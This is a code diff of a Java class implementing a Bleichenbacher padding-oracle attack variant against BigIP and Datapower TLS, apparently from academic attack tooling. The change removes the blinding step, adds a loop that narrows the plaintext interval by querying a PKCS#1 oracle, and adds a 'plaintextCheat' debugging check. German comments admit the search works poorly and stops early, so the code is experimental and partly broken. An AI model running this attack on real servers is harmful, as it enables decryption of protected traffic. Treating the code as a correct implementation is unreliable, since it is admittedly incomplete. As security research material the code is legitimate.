@@ -1,11 +1,12 @@
 package de.rub.nds.ssl.attacker.bleichenbacher;
 
+import de.rub.nds.ssl.attacker.bleichenbacher.Interval;
+import de.rub.nds.ssl.attacker.bleichenbacher.OracleException;
 import de.rub.nds.ssl.attacker.bleichenbacher.oracles.AOracle;
 import de.rub.nds.ssl.attacker.misc.Utility;
 import java.io.BufferedWriter;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
-import java.util.ArrayList;
 
 /**
  * Bleichenbacher algorithm for BigIP and Datapower
@@ -25,6 +26,7 @@ public class BleichenbacherBigIP {
     protected final BigInteger big256B;
     protected final boolean msgIsPKCS;
     protected BufferedWriter bw;
+    protected BigInteger plaintextCheat;
     
     public BleichenbacherBigIP(final byte[] msg,
             final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
@@ -46,185 +48,133 @@ public class BleichenbacherBigIP {
         tmp = ((tmp / Utility.BITS_IN_BYTE) - 2) * Utility.BITS_IN_BYTE;
         bigB = BigInteger.valueOf(2).pow(tmp);
         big256B = bigB.multiply(BigInteger.valueOf(256));
-        System.out.println("B computed: " + bigB);
-        System.out.println("Blocksize: " + blockSize + " bytes");
+//        logger.info("B computed: " + bigB);
+//       logger.info("Blocksize: " + blockSize + " bytes");
     }
 
     public void attack() throws OracleException {
         int i = 0;
-        boolean solutionFound = false;
+        c0 = new BigInteger(1, encryptedMsg);
 
-        System.out.println("Step 1: Blinding");
-        if (this.msgIsPKCS) {
-            System.out.println("Step skipped --> "
-                    + "Message is considered as PKCS compliant.");
-            s0 = BigInteger.ONE;
-            c0 = new BigInteger(1, encryptedMsg);
-            m = new Interval[]{
-                new Interval(BigInteger.valueOf(2).multiply(bigB),
-                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
-        } else {
-            stepOne();
-        }
-
+//        logger.info("Step 1: Blinding omitted ");
         i++;
 
-//        while (!solutionFound) {
-        System.out.println("Step 2: Searching for PKCS conforming messages.");
-        stepTwo(i);
-
-//            System.out.println("Step 3: Narrowing the set of soultions.");
-//            stepThree(i);
-//
-//            System.out.println("Step 4: Computing the solution.");
-//            solutionFound = stepFour(i);
-//            i++;
-//
-//            System.out.println("// Total # of queries so far: "
-//                    + oracle.getNumberOfQueries());
-//        }
-    }
-
-    protected void stepOne() throws OracleException {
-        BigInteger n = publicKey.getModulus();
-        BigInteger ciphered = new BigInteger(1, encryptedMsg);
-
-        boolean pkcsConform;
-        byte[] tmp;
-        byte[] send;
-
-        do {
-            si = si.add(BigInteger.ONE);
-            send = prepareMsg(ciphered, si);
-
-            // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
-        } while (!pkcsConform);
-
-        c0 = new BigInteger(1, send);
-        s0 = si;
-        // mi = {[2B,3B-1]}
-        m = new Interval[]{
-            new Interval(BigInteger.valueOf(2).multiply(bigB),
-            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
-
-        System.out.println(" Found s0 : " + si);
-    }
-
-    protected void stepTwo(final int i) throws OracleException {
-        byte[] send;
-        BigInteger n = publicKey.getModulus();
-
-        this.stepTwoX();
-
-//        if (i == 1) {
-//            this.stepTwoA();
-//        } else {
-//            if (i > 1 && m.length >= 2) {
-//                stepTwoB();
-//            } else if (m.length == 1) {
-//                stepTwoC();
-//            }
-//        }
-//
-//        System.out.println(" Found s" + i + ": " + si);
-    }
-
-    protected void stepTwoX() throws OracleException {
         byte[] send;
         boolean pkcsConform;
         BigInteger n = publicKey.getModulus();
 
-        System.out.println(" n / 256 B: "
-                + Utility.bytesToHex(publicKey.getModulus().divide(big256B).toByteArray()));
+//        logger.info("Step 2X: Starting the search");
 
-        System.out.println("Step 2X: Starting the search");
-
-        // the smallest possible multiplication value, which gives us (0x01 0x02),
-        // when multiplying a message in <2B,3B)
-        si = BigInteger.valueOf((256 / 3) - 1);
+        // max value for q, it should not be larger than n/256B
+        int qMax = n.divide(big256B).intValue();
+//        logger.debug("qmax (n/256B): " + qMax);
 
         BigInteger lowerBound = bigB.multiply(BigInteger.valueOf(2));
         BigInteger upperBound = bigB.multiply(BigInteger.valueOf(3));
 
-        while (si.compareTo(BigInteger.valueOf(1500)) == -1) {
+        BigInteger ri = BigInteger.ZERO;
 
-            si = si.add(BigInteger.ONE);
-            send = prepareMsg(c0, si);
+        while (true) {
+            for (int q = 1; q < qMax/2; q++) {
+                if(ri.compareTo(BigInteger.ZERO) == 0 && q==0)
+                    continue;
+                BigInteger sMin = computeSMin(ri, q, n, upperBound);
+                BigInteger sMax = computeSMax(ri, q, n, lowerBound);
+                si = sMin;
+                while (si.compareTo(sMax) == -1) {
+                    si = si.add(BigInteger.ONE);
+                    send = prepareMsg(c0, si);
+                    // check PKCS#1 conformity
+                    pkcsConform = oracle.checkPKCSConformity(send);
+                    if (pkcsConform) {
+                        lowerBound = computeLowerBound(ri, q, n, lowerBound, upperBound, si);
+                        upperBound = computeUpperBound(ri, q, n, lowerBound, upperBound, si);
+//                        logger.debug("Message: " + Utility.bytesToHex(send));
+                        System.out.println("Lower: " + Utility.bytesToHex(lowerBound.toByteArray()));
+                        System.out.println("Upper: " + Utility.bytesToHex(upperBound.toByteArray()));
 
-            // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
-            if (pkcsConform) {
-                BigInteger[] bi = this.step2xComputeNewBound(si,
-                        lowerBound, upperBound);
-                if (bi != null) {
-                    lowerBound = bi[0].subtract(BigInteger.ONE);
-                    upperBound = bi[1].add(BigInteger.ONE);
-                    System.out.println(Utility.bytesToHex(bi[0].toByteArray()));
-                    System.out.println(Utility.bytesToHex(bi[1].toByteArray()));
+                        ri = upperBound.multiply(si).subtract(bigB).subtract(bigB);
+                        ri = ri.divide(n);
+                        ri = ri.multiply(BigInteger.valueOf(2));
+                        System.out.println("qMax: " + qMax + " q: " + q);
+                        System.out.println("ri: " + ri);
+                        
+                        // ok, es funktioniert nicht so toll, daher breche ich hier ab
+                        // es ist aber klar, dass das Interval sehr klein wurde und man kann anschliessend
+                        // einen Brute-Force Angriff durchführen
+                        if ((upperBound.subtract(lowerBound)).compareTo(BigInteger.valueOf(10000)) == -1) {
+                            System.out.println("Attack finished, the message is in interval: ");
+                            System.out.println("Lower: " + Utility.bytesToHex(lowerBound.toByteArray()));
+                            System.out.println("Upper: " + Utility.bytesToHex(upperBound.toByteArray()));
+                            System.out.println("Number of oracle queries: " + oracle.getNumberOfQueries());
+                            return;
+                        }
+                        if(lowerBound.compareTo(plaintextCheat) == 1) {
+                            throw new RuntimeException("invalid state");
+                        }
+                        if(upperBound.compareTo(plaintextCheat) == -1) {
+                            throw new RuntimeException("invalid state");
+                        }
+                    }
                 }
             }
+            ri = ri.add(BigInteger.ONE);
         }
-        System.out.println(si);
     }
 
-    private BigInteger step3ComputeUpperBound(final BigInteger s,
-            final BigInteger modulus, final BigInteger upperIntervalBound) {
-        BigInteger upperBound = upperIntervalBound.multiply(s);
-        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
-        // ceil
-        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
-        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
-            upperBound = BigInteger.ONE.add(tmp[0]);
-        } else {
-            upperBound = tmp[0];
-        }
+    private BigInteger computeSMin(BigInteger r, int q, BigInteger n, BigInteger upperBound) {
 
-        return upperBound;
+        BigInteger result = bigB.multiply(BigInteger.valueOf(2));
+        result = result.add(n.multiply(r));
+        result = result.add(big256B.multiply(BigInteger.valueOf(q)));
+
+        result = result.divide(upperBound);
+
+        return result;
     }
 
-    private BigInteger step3ComputeLowerBound(final BigInteger s,
-            final BigInteger modulus, final BigInteger lowerIntervalBound) {
-        BigInteger lowerBound = lowerIntervalBound.multiply(s);
-        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(bigB));
-        lowerBound = lowerBound.add(BigInteger.ONE);
-        lowerBound = lowerBound.divide(modulus);
+    private BigInteger computeSMax(BigInteger r, int q, BigInteger n, BigInteger lowerBound) {
 
-        return lowerBound;
+        BigInteger result = bigB.multiply(BigInteger.valueOf(3));
+        result = result.add(n.multiply(r));
+        result = result.add(big256B.multiply(BigInteger.valueOf(q)));
+
+        result = result.divide(lowerBound);
+
+        return result;
     }
 
-    protected BigInteger[] step2xComputeNewBound(final BigInteger s,
-            final BigInteger oldLowerBound, final BigInteger oldUpperBound) {
+    private BigInteger computeLowerBound(BigInteger r, int q, BigInteger n,
+            BigInteger lowerBound, BigInteger upperBound, BigInteger s) {
 
-        for (int i = 1; i < 160; i++) {
-            BigInteger upper = bigB.multiply(BigInteger.valueOf(i * 256 + 3));
-            BigInteger lower = bigB.multiply(BigInteger.valueOf(i * 256 + 2));
-            BigInteger newLower = lower.divide(s);
-            BigInteger newUpper = upper.divide(s);
-            if (newLower.compareTo(oldLowerBound) == 1
-                    && newUpper.compareTo(oldUpperBound) == -1) {
-                BigInteger[] bi = {newLower, newUpper};
-                return bi;
+        BigInteger result = bigB.multiply(BigInteger.valueOf(2));
+        result = result.add(n.multiply(r));
+        result = result.add(big256B.multiply(BigInteger.valueOf(q)));
+
+        result = result.divide(s);
+
+        if (result.compareTo(lowerBound) == 1) {
+            if (result.compareTo(upperBound) == -1) {
+                return result.add(BigInteger.ONE);
             }
         }
-        return null;
-    }
-
-    protected BigInteger step2cComputeLowerBound(final BigInteger r,
-            final BigInteger modulus, final BigInteger upperIntervalBound) {
-        BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
-        lowerBound = lowerBound.add(r.multiply(modulus));
-        lowerBound = lowerBound.divide(upperIntervalBound);
-
         return lowerBound;
     }
 
-    protected BigInteger step2cComputeUpperBound(final BigInteger r,
-            final BigInteger modulus, final BigInteger lowerIntervalBound) {
-        BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
-        upperBound = upperBound.add(r.multiply(modulus));
-        upperBound = upperBound.divide(lowerIntervalBound);
+    private BigInteger computeUpperBound(BigInteger r, int q, BigInteger n,
+            BigInteger lowerBound, BigInteger upperBound, BigInteger s) {
 
+        BigInteger result = bigB.multiply(BigInteger.valueOf(3));
+        result = result.add(n.multiply(r));
+        result = result.add(big256B.multiply(BigInteger.valueOf(q)));
+
+        result = result.divide(s);
+
+        if (result.compareTo(upperBound) == -1) {
+            if (result.compareTo(lowerBound) == 1) {
+                return result;
+            }
+        }
         return upperBound;
     }
 
@@ -240,8 +190,8 @@ public class BleichenbacherBigIP {
         BigInteger tmp;
 
         if (oracle.getNumberOfQueries() % 100 == 0) {
-            System.out.println("# of queries so far: " + oracle.
-                    getNumberOfQueries());
+//            logger.debug("# of queries so far: " + oracle.
+//                    getNumberOfQueries());
         }
 
         // if we use a real oracle (not a plaintext oracle), the si value has
@@ -263,8 +213,12 @@ public class BleichenbacherBigIP {
 
         return msg;
     }
-    
+
     public BigInteger getSi() {
         return si;
+    }
+    
+    public void setPlaintextCheat(byte[] plain) {
+        this.plaintextCheat = new BigInteger(plain);
     }
 }
